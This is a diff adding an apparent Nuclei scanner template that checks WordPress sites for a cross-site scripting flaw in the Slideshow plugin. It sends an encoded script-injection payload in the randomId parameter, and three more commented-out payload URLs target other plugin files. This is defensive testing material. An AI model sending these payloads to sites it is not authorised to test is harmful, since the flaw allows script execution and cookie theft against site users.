@@ -1,0 +1,56 @@
+id: wp-slideshow-xss
+
+info:
+  name: WordPress Slideshow - Cross-Site Scripting
+  author: daffainfo
+  severity: high
+  description: WordPress Slideshow plugin contains multiple cross-site scripting vulnerabilities. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+  reference:
+    - https://www.exploit-db.com/exploits/37948
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 1
+  tags: wordpress,xss,wp-plugin,edb
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /wp-content/plugins/slideshow-jquery-image-gallery/readme.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - 'Slideshow'
+          - 'Stable tag:'
+        condition: and
+
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?randomId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      #  - '{{BaseURL}}/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?slides[0][type]=text&slides[0][title]=%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E'
+      #  - '{{BaseURL}}/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/settings.php?settings[][group]=%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E'
+      #  - '{{BaseURL}}/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/style-settings.php?settings[0]&inputFields[0]=%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "</script><script>alert(document.domain)</script>"
+        part: body
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100a3ed62077b9d31f53dc0a9a31dc1b348fb123cb48be9bb245f90c62bcc9347680220295ccb7c2a640516a858853ac0ab3a3da6e9ab786cdd8957c6f95ea0924f2137:922c64590222798bb761d5b6d8e72950
